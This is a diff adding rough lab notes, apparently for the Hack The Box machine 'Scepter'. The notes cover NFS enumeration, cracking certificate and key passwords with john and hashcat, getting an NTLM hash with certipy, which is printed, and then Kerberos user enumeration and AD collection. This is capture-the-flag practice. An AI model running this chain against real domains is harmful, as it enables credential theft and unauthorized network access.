@@ -1,0 +1,107 @@
+nmap -sV -sC -vv -oA nmap/scepter ip address
+
+since there is no port 80 or 443 to go to, 
+
+start with nfs, quick to enumerate 
+
+make directory nfs 
+mkdir nfs
+
+then use showmount ip adderess
+
+showmount -e ip address: e is for exports list
+
+we want to mount the nfs using 
+sudo mount -t nfs ipaddress:/the mounts that was shown from line 10 createdfolder/
+
+showmount -a 10.129.182.251 will show all mounted directories 
+
+when trying to get to the nfs directory, getting permission denied, use sudo su to get to root to get to the directory
+
+cd into the directory, 
+
+then do a cp * .. to copy the directories back a directory
+
+then do chown name:name *.* to give permissions to everything
+
+baker.key is encrypted, so needs to be decrypted to be able to look at it 
+
+use openssl x509 -in baker.crt -noout text | less
+
+try: openssl pkcs12 -in clark.pfx -clcerts -nokeys
+
+start to crack the keys
+
+creating the hash
+pem2john baker.key
+pem2john baker.key > baker.pem.hash
+pfx2john *.pfx
+pfx2john *.pfx > scepter.pfx.hash
+
+break the hashes
+
+breaking sepcter first 
+hashcat cant break pfx files
+hashcat -username scepter.pfx.hash /usr/share/wordlists/rockyou.txt
+
+using john
+john --wordlist=/usr/share/wordlists/rockyou.txt scepter.pfx.hash
+
+use --show to show to results 
+
+john scepter.pfx.hash --show
+
+break the baker.pem.hash
+
+using hashcat for baker.pem.hash
+
+if not working, can go to hashcat documentation and search for Beginning of the hash file, to find the mode
+
+in the baker.pem.hash file, we changed the $pem$1$ > $pem$2$ to try and crack it
+
+once cracked, use openssl pkcs12 -in clark.pfx -clcerts -nokeys
+then enter the cracked passwords
+
+certipy auth -pfx " pfx file name" -password password -dc-ip ipaddress
+
+ex: certipy -auth -pfx clark.pfx -password newpassword -dc-ip 10.129.182.251
+
+create a users.text file 
+
+vi users.txt
+rtrying to see what user account is still valid and the certs are still valid
+kerbrute userenum
+kerbrute userenum users.txt --dc scepter.htb -d scepter.htb -v
+
+use openssl to creat the pfx
+
+openssl pkcs12 -export -inkey baker.key -in baker.crt -out d.baker.pfx
+
+run certipy auth -pfx d.baker.pfx -dc-ip 10.129.182.251
+
+line 80 will give us an NTLM hash,
+
+if it doesnt work, possibly time issue,
+
+do sudo ntpdate ip address
+
+once we get the hash, 
+
+we insert it into a creds.txt
+
+vi credts.txt 
+
+d.baker:aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce NTLM
+
+use netexec to create a kerbrose file 
+nxc smb dc01.scepter.htb --generate-krb5-file scepter.krbconf
+
+copy the krb.konf file to /etc/krb5.conf 
+
+ex: sudo cp scepter.krbconf  /etc/krb5.conf
+
+using rusthound
+KRB5CCNAME=d.baker.ccache rusthound-ce -k -c All -d scepter.htb -f dc01.scepter.htb -z
+
+run this to see if there anything that is wrong with the files
+cat * | jq . 1>/dev/null
